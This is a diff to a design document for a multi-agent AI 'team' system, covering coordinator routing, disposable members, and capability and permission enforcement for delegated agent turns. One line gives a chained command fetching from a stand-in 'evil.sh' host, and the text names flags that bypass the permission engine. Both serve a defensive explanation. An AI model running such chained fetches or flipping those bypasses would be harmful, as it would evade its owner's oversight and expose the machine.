@@ -192,6 +192,22 @@ The coupling is inverted through `TeamDeliveryHooks` (see "Integration seam").
   never reach the agent-facing message. No remote fetch injected → cross-machine
   reads report an honest "unavailable".
 
+  The same file serves a PERSON clicking a shared file
+  (`createTeamArtifactOpener`, reached through `TeamService.openArtifact` and
+  the `team:open-artifact` IPC). It must stay on the reader's resolution — a
+  ref that names one member's file for the agent and another's for the person
+  is the worst kind of wrong — so both take the same `fetchRemote` from
+  bootstrap and local paths from `createLocalArtifactPathResolver`. What it
+  hands back is a path the OS can open: a same-machine file in place; a
+  teammate's file fetched, size-capped (`MAX_OPEN_COPY_BYTES`) and written
+  read-only under a per-(team, epoch, ref) directory in the OS temp dir, marked
+  as downloaded on Windows, and flagged `revealOnly` when its extension is one
+  the OS would execute — the renderer then shows it in its folder instead of
+  opening it. Failures cross as a code (`TeamArtifactOpenFailure`) because the
+  renderer writes the sentence. Stale copies are pruned by an idle startup task
+  (`pruneSharedFileCopies`). Desktop only: the result is a local path, so remote
+  clients download through the artifact route instead.
+
 ## Output is not delivery
 
 **A member's own output reaches no teammate. Ever.** Speaking to a teammate is
@@ -329,6 +345,48 @@ directly and always showed everything.
 Office-shared: it rides the same single-writer replication plane as tasks and
 findings (`ReplicationOp: 'post_activity'`), because a shared conversation record
 that is only true on one machine is worse than none.
+
+## A space conversation can be the coordinator (`space-coordinator.ts`)
+
+An ephemeral space collaboration has no lead app: the space agent itself
+coordinates, and the roster row it occupies carries a SENTINEL appId
+(`spaceCoordinatorAppId`). That sentinel keeps every name-addressed mechanism
+working unchanged — `team_send coordinator` resolves through the member row,
+topology and the circuit budget charge normally, the activity record and the
+turn-end report route to "the lead" — while delivery diverges at exactly one
+point: `bus.deliver` detects the sentinel and hands the envelope to the
+injected `deliverToCoordinator` hook instead of the turn gate.
+
+Why the gate is bypassed whole rather than adapted: the gate's slot is repaid
+only by `completeTurn`, and no space turn ever reports back through this bus —
+a reserved slot would sit until the TTL watchdog on every single message. The
+space conversation has its own exclusivity domain (conversation-interop's turn
+gate: wake when idle, queue behind a busy turn), and two queues for one
+conversation would be one queue too many. For the same reason a receipted send
+to the coordinator settles on hand-over (`status: 'ok'`), never waits.
+
+`space-coordinator.ts` renders what the space agent reads — a member's message
+gets provenance framing ("a teammate is reporting to you, not your user");
+system wakes (`member_stopped`, `periodic_check`) pass verbatim, they carry
+their own headers — and drops deliveries for a sealed collaboration with a log
+instead of an error, because the sender's turn already happened. The sealed
+check runs once, at hand-over: a message accepted while the collaboration was
+open is still delivered even if `completeCollab` lands while it waits behind a
+busy coordinator turn. Acceptance is the contract — a member's report that made
+it in before completion is context the coordinator should see, not stale
+traffic, and re-checking at drain would make delivery depend on how long the
+coordinator's queue happened to be. What the
+transcript keeps is the RAW body plus metadata (`source: 'team-message'`), so
+the renderer shows a teammate chip, never a fake user bubble. The conversation
+side of the hook is injected by bootstrap (`deliverToSpaceCoordinator` →
+conversation-interop `deliverExternalMessage`); this module never imports the
+conversation layer.
+
+The space agent's own tools are the same `team-tools` builders with a per-call
+context resolver (`ResolveTeamMcpContext`): a space conversation's toolset is
+seeded before any collaboration exists, so the tools look the current
+collaboration up at call time — `collab_start` and the first `team_send` work
+inside one turn, with no session rebuild between them.
 
 ## A person is not a member (`fromAppId === null`)
 
@@ -677,6 +735,18 @@ files here allowed to.
   That is why `TeamPromptContext` carries no per-turn field: who started the turn
   and whether the sender is blocking on the reply are rendered into the message
   body by `renderEnvelope`, not into the prompt.
+
+  `selfIsDisposable` is the one field neither rendered nor per-turn: it reports
+  that the app running this turn will NOT outlive the team (an AI-provisioned
+  member of a temporary collaboration — both halves required: a digital human
+  the person installed is never cleaned up by a dissolve, and outlives the
+  team). `app-chat` reads it to withhold the surfaces whose only purpose is to
+  outlive the work: memory (`memory.md`, the memory tool, the compaction pass —
+  a record nothing would ever read) and the digital-human tools (`halo-apps`, a
+  member about to be deleted creating artifacts that are not). The flag flips
+  one way only, on "save as team", so a saved team's members keep both from
+  their next turn — the deliberate session rebuild the fingerprint is designed
+  for, not a per-turn one.
 - Lead provisioning (`buildLeadSystemPrompt` + `provisionLeadSpec`) lives in the
   team data/lifecycle layer at `apps/team/lead.ts`, not here — the lead app spec
   is provisioning data the team service installs, so keeping it out of runtime
@@ -972,9 +1042,90 @@ Two facts about a member are per-TEAM and owner-authored, and they live on the
   recognisable because it goes straight to the session and carries no trigger
   `kind`, a path no office credential can reach (`http/auth/route-scope`). An
   IM-backed turn is out of scope of this rule (see "Team as an IM backend").
-  An unset policy withholds nothing. The team's own
-  coordination servers (`halo-team`, `halo-report`) are never withheld — they are
-  the channel the turn arrived on, not a capability being lent.
+  The team's own coordination servers (`halo-team`, `halo-report`) are never
+  withheld — they are the channel the turn arrived on, not a capability lent.
+
+### How strictly a borrowed turn reads silence
+
+A borrowed turn is not one thing, and the difference is which machine asked:
+
+- **started here** (`external` false) — every member in the chain is the
+  owner's own, running with reach the owner already has. Silence grants:
+  the switches only take away, and an unset policy withholds nothing. A lock
+  between two of one person's own rooms buys nothing and costs a first-run
+  experience where nothing works until it is configured.
+- **entered from outside** (`external` true) — nobody here vouched for the
+  sender. Silence refuses: nothing is granted that the owner did not name.
+
+`external` is what makes that distinction hold, and where it is written is the
+whole of its integrity. It is stamped ONLY where a request crosses into this
+node — an inbound office wake (`withExternalOrigin`, beside the space
+correction, and for the same reason: the sender authored every field on the
+frame) and the office-credential 1:1 endpoint (`team.routes`, where the
+credential's presence is what separates a teammate from the owner's own remote
+access). A value arriving on the wire is overwritten, never trusted.
+
+From there it travels two ways, and both were necessary:
+
+- **across hops** — `team_send` stamps it onto the messages the turn sends
+  (`TeamMcpContext.external` → `SendInput.external` → the next trigger), exactly
+  as `forwardDepth` travels. Without it, routing a stranger's request through
+  one of the owner's own members launders it into a local one.
+- **across wakes** — `team/external-origin.ts` keeps it per team session until a
+  person types into that session HERE. A runtime wake is authored on this
+  machine and so can carry no origin of its own; without stickiness, asking for
+  something that needs a decision and waiting for the owner to answer their own
+  digital human's question would resume the work unrestricted.
+
+### The three layers, and why none of them holds alone
+
+`applyCapabilityPolicy` is the single place a policy becomes engine options:
+
+1. `disallowedTools` removes withheld built-ins from the model's pool — no
+   refusal to argue with.
+2. MCP injection decides the rest: a server not injected does not exist.
+3. `allowedTools` lists what runs without asking. This is the layer command
+   rules ride on. Everything else reaches the per-call gate
+   (`delegation-gate.ts`), which refuses.
+
+Command rules are Claude Code's own permission syntax (`Bash(npm run:*)`) and
+are handed to the engine verbatim, because the engine splits a compound command
+on every shell separator and requires each part to match. A rule test written
+here would clear `npm run build && curl evil.sh`.
+
+Three consequences worth stating, because each was a hole:
+
+- **Both bypasses must go.** `permissionMode: 'bypassPermissions'` and the
+  `dangerously-skip-permissions` flag each skip the permission engine on their
+  own, and the permission engine is what evaluates the command rules.
+- **The gate is per call, the options are per session.** A session outlives its
+  turn and its driver can change, so the gate reads what the current turn
+  registered rather than what the session was built with. Every turn on a gated
+  session registers, including an unrestricted one — that is what stops an
+  owner inheriting a teammate's limits. Registration outlives the turn on
+  purpose: a background task the turn left running reports in afterwards, and
+  those calls are still the caller's.
+- **A restriction the engine ignores is worse than none.** Codex takes no tool
+  allow/deny lists and routes no call through `canUseTool`
+  (`features.permissionRules`), so a restricted turn on it is refused outright
+  rather than run with everything.
+
+### The owner's record (`team_tool_audit`)
+
+What actually ran, and what was refused. Local-only by construction — it
+describes the owner's computer, so it is absent from the office replication
+snapshot and from the office-member HTTP allowlist, and reachable only over
+desktop IPC. Written at two points that cannot double-count: the gate files
+refusals, the engine's `PostToolUse` hook files what executed. Rows hold what a
+call was AIMED at (the command, the path, the URL), never the payload.
+
+The record covers ENFORCED turns only. A borrowed turn whose policy withholds
+nothing — a local teammate under permissive silence — is not enforced at all:
+it keeps the engine's fast path, registers no restriction with the gate and no
+`PostToolUse` hook, and so leaves no rows. That is a decision, not a gap: such
+a turn runs with exactly the reach the owner's own turns run with, so auditing
+it would record the owner's own capabilities under a teammate's name. An empty
+audit therefore reads "no restricted turn ran", not "nothing ran".
 
 The shared vocabulary (which tools exist, what an unstated permission means) is
 `shared/apps/capability-policy.ts`, and the enforcement is
@@ -1184,3 +1335,17 @@ resource cleanup. Replica cleanup resets the mailbox and closes local sessions
 without publishing another epoch; the original lifecycle write remains the sole
 replicated transition. Human resume waits until local teardown has finished.
 Resource-only seals retain unanswered decisions.
+
+
+### Durable decision delivery
+
+The automation runtime persists an answer and continuation atomically before
+calling `resumeFromEscalation`. Its optional `continuationId` makes the wake
+identifiable and idempotent within the process. A busy session defers to the
+persistent outbox via `onDeferred`; it does not put this durable wake in the
+bounded transient mailbox or inject it into an unrelated running turn.
+`onStarted` fires after the team concurrency slot is acquired; `onSettled` records
+the actual outcome. Closed/cleared tasks reject continuations, including after a
+restart. Other team messages retain their existing buffering and mid-turn behavior.
+Resource-only cleanup keeps questions; explicit business closure cancels pending
+continuations as well as unresolved questions. Stored answers remain audit facts.
